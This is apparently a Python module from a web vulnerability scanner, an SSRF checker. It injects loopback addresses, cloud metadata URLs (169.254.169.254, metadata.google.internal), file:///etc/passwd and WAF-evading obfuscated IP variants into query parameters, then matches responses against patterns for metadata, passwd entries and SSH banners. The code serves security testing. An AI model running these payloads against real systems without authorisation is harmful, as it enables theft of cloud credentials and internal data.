"""SSRF (Server-Side Request Forgery) Vulnerability Checker - Enhanced with IP Obfuscation"""

import re
import os
import asyncio
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, quote

from .base_check import BaseVulnCheck
from .base import WAFEvasion  # Updated import path
from utils.helpers import helpers
from utils.logger import logger

class SSRFPayloadChecker(BaseVulnCheck):
    """SSRF vulnerability detector with IP obfuscation support"""
    
    def __init__(self, http_client, config):
        super().__init__(http_client, config)
        
        # Load SSRF payloads from wordlist
        self.payloads = self.load_payloads('ssrf')
        
        # If wordlist is empty, generate smart payloads
        if not self.payloads:
            basic_payloads = [
                'http://127.0.0.1',
                'http://localhost',
                'http://0.0.0.0',
                'http://[::1]',
                'http://169.254.169.254/latest/meta-data/',
                'http://metadata.google.internal/computeMetadata/v1/',
                'file:///etc/passwd',
            ]
            
            # Enhance with obfuscated IPs for evasion
            self.payloads = []
            for p in basic_payloads:
                self.payloads.append(p)
                # If payload contains a target IP (like localhost/127.0.0.1), obfuscate it
                if '127.0.0.1' in p:
                    # Generate http://2130706433, http://0x7f000001, etc.
                    variants = WAFEvasion.ip_obfuscate('127.0.0.1')
                    for v in variants:
                        self.payloads.append(f"http://{v}")
            
            # Add port specific tests
            self.payloads.extend([
                'http://127.0.0.1:22',
                'http://127.0.0.1:80',
                'http://127.0.0.1:443',
                'http://127.0.0.1:8080'
            ])
        
        # Patterns to detect in responses
        self.detection_patterns = {
            'aws_metadata': r'ami-id|instance-id|public-keys|security-groups',
            'azure_metadata': r'azure|compute|subscriptionId|resourceGroupName',
            'gcp_metadata': r'google|computeMetadata|project-id',
            'docker': r'docker|containerd|cgroup',
            'file_contents': r'root:[^:]*:[0-9]*:[0-9]*:|\[fonts\]|\[extensions\]',
            'ssh_banner': r'SSH-[0-9.]+-OpenSSH',
        }

    @property
    def name(self) -> str:
        return "SSRF Checker"
    
    @property
    def severity(self) -> str:
        return "CRITICAL"
        
    async def test_parameter(self, url: str, param: str, original_val: str, payload: str) -> Dict:
        """Test a single parameter with a specific payload"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        query = urlencode(params, doseq=True)
        test_url = parsed._replace(query=query).geturl()
        
        try:
            start_time = time.time()
            response = await self.http_client.request("GET", test_url)
            duration = time.time() - start_time
            
            response_text = response.text if hasattr(response, 'text') else ""
            
            # Analyze response for indicators
            indicators = self.analyze_response(response_text)
            
            if indicators:
                return {
                    'url': test_url,
                    'parameter': param,
                    'payload': payload,
                    'confidence': 'HIGH',
                    'description': f'Potential SSRF detected. Indicators: {", ".join(indicators)}',
                    'recommendation': 'Implement strict whitelist for outgoing requests',
                    'evidence': indicators
                }
                
            # Time-based heuristic
            if duration > 5 and "timeout" not in response_text.lower():
                 return {
                    'url': test_url,
                    'parameter': param,
                    'payload': payload,
                    'confidence': 'LOW',
                    'description': 'Response delay detected (Blind SSRF candidate)',
                    'recommendation': 'Investigate potential internal network scanning',
                    'evidence': f'Delay: {duration:.2f}s'
                }

        except Exception:
            pass
            
        return None

    def analyze_response(self, response_text: str) -> List[str]:
        """Check response content for SSRF signatures"""
        indicators = []
        for name, pattern in self.detection_patterns.items():
            if re.search(pattern, response_text, re.IGNORECASE):
                indicators.append(name)
        return indicators

    async def run(self, target_url: str) -> Dict:
        """Execute SSRF scan"""
        self.logger.info(f"Starting SSRF scan for: {target_url}")
        start_time = time.time()
        
        all_findings = []
        parsed = urlparse(target_url)
        query_params = parse_qs(parsed.query)
        
        total_payloads_tested = 0
        
        if query_params:
            self.logger.info(f"Testing {len(query_params)} parameters for SSRF...")
            
            for param, values in query_params.items():
                value = values[0] if values else ""
                
                for payload in self.payloads:
                    total_payloads_tested += 1
                    result = await self.test_parameter(target_url, param, value, payload)
                    
                    if result:
                        all_findings.append(result)
                        self.add_finding({
                            "type": "SSRF",
                            "url": result['url'],
                            "parameter": result['parameter'],
                            "payload": result['payload'],
                            "severity": self.severity,
                            "confidence": result['confidence'],
                            "description": result['description'],
                            "recommendation": result['recommendation'],
                            "evidence": str(result['evidence'])
                        })
                        break  # Stop testing this parameter if vulnerability found
        
        execution_time = time.time() - start_time
        self.metrics['test_cases_run'] = total_payloads_tested
        
        return {
            "vulnerable": len(all_findings) > 0,
            "findings": all_findings,
            "stats": {
                "parameters_tested": len(query_params),
                "payloads_tested": total_payloads_tested,
                "vulnerabilities_found": len(all_findings),
                "execution_time": execution_time
            }
        }